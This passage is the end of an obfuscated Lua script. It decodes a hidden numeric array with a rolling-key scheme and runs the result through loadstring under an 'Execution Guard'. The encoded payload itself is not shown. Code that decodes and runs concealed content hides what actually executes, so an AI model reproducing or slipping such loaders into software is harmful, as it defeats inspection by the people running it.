    local function VM_OlI0I(d, k, m)
        local R_lO1OOO1I = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_lO1OOO1I, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_lO1OOO1I)
    end

    -- Execution Guard
    local F_lOI1I = loadstring(VM_OlI0I(B_ll1lO0O, 89, 5))
    if F_lOI1I then
        F_lOI1I(...)
    end
end)(...)
